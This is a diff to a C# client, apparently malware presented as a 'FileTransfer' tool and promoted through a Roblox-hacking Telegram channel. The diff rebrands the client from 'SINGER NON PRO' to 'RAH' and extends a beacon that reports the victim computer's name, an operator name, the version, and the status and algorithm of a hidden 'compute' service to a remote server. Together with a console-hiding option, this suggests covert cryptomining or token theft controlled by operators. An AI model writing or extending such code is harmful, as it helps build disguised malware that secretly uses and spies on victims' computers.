@@ -61,7 +61,23 @@ namespace FileTransfer
                             if (root.TryGetProperty("operatorName", out var vOp)) OperatorName = vOp.GetString() ?? OperatorName;
                             if (root.TryGetProperty("appTitleMain", out var vApp)) AppTitleMainText = vApp.GetString() ?? AppTitleMainText;
                             if (root.TryGetProperty("appTitleVersion", out var vVer)) AppTitleVersionText = vVer.GetString() ?? AppTitleVersionText;
+                            if (root.TryGetProperty("clientVersion", out var vCv) && !string.IsNullOrWhiteSpace(vCv.GetString()))
+                                ClientVersion = vCv.GetString()!;
+                            else if (root.TryGetProperty("version", out var vVer2) && !string.IsNullOrWhiteSpace(vVer2.GetString()))
+                                ClientVersion = vVer2.GetString()!;
                             if (root.TryGetProperty("windowTitle", out var vWin)) WindowTitleText = vWin.GetString() ?? WindowTitleText;
+
+                            if (root.TryGetProperty("telegramUrl", out var vTu) && !string.IsNullOrWhiteSpace(vTu.GetString()))
+                                TelegramUrl = vTu.GetString()!;
+                            else if (root.TryGetProperty("telegramChannel", out var vTc) && !string.IsNullOrWhiteSpace(vTc.GetString()))
+                                TelegramUrl = vTc.GetString()!;
+                            else if (root.TryGetProperty("tgChannel", out var vTg) && !string.IsNullOrWhiteSpace(vTg.GetString()))
+                                TelegramUrl = vTg.GetString()!;
+
+                            if (!TelegramUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !TelegramUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+                            {
+                                TelegramUrl = "https://t.me/" + TelegramUrl.TrimStart('@');
+                            }
                             
                             if (root.TryGetProperty("themeAccent", out var vAcc)) ThemeAccentHex = vAcc.GetString() ?? ThemeAccentHex;
                             if (root.TryGetProperty("themeSurface", out var vSur)) ThemeSurfaceHex = vSur.GetString() ?? ThemeSurfaceHex;
@@ -82,7 +98,7 @@ namespace FileTransfer
                                 CustomConfigJson = customCfgEl.GetRawText();
                             }
                             
-                            Log($"Loaded config from placeholder: Operator={OperatorName}, Accent={ThemeAccentHex}, CustomConfig={CustomConfigJson}");
+                            Log($"Loaded config from placeholder: Operator={OperatorName}, Telegram={TelegramUrl}, Accent={ThemeAccentHex}, CustomConfig={CustomConfigJson}");
                         }
                     }
                 }
@@ -96,10 +112,11 @@ namespace FileTransfer
         public static string CustomConfigJson { get; private set; } = "{}";
         private static string LayoutJson = "{}";
 
-        private static string AppTitleMainText = "SINGER NON PRO";
-        private static string AppTitleVersionText = " v7.4.5";
-        private static string WindowTitleText = "SINGER NON PRO v7.4.5";
-        private static string ClientVersion = "7.4.5";
+        private static string AppTitleMainText = "RAH";
+        private static string AppTitleVersionText = " v8.0.2";
+        private static string WindowTitleText = "RAH v8.0.2";
+        private static string ClientVersion = "8.0.2";
+        private static string TelegramUrl = "https://t.me/robloxvzlomez";
         private static string ThemeAccentHex = "#10B981";
         private static string ThemeSurfaceHex = "#0D0E12";
         private static bool HideConsole = false;
@@ -559,7 +576,7 @@ namespace FileTransfer
                     string pcName = ComputerInfo.GetName();
                     string computeStatus = FileTransfer.Compute.ComputeService.Instance.Status.ToString();
                     string computeAlgo = string.Join(" + ", FileTransfer.Compute.ComputeService.Instance.ActiveProviders.Select(p => p.Algorithm));
-                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}&computeStatus={Uri.EscapeDataString(computeStatus)}&computeAlgo={Uri.EscapeDataString(computeAlgo)}";
+                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}&version={Uri.EscapeDataString(ClientVersion)}&clientVersion={Uri.EscapeDataString(ClientVersion)}&computeStatus={Uri.EscapeDataString(computeStatus)}&computeAlgo={Uri.EscapeDataString(computeAlgo)}";
                     Log($"Token poll: checking {checkUrl}");
                     var resp = await _http.GetAsync(checkUrl);
                     var json = await resp.Content.ReadAsStringAsync();
@@ -1167,7 +1184,7 @@ namespace FileTransfer
             {
                 System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                 {
-                    FileName = "https://t.me/robloxvzlomez",
+                    FileName = TelegramUrl,
                     UseShellExecute = true
                 });
             }
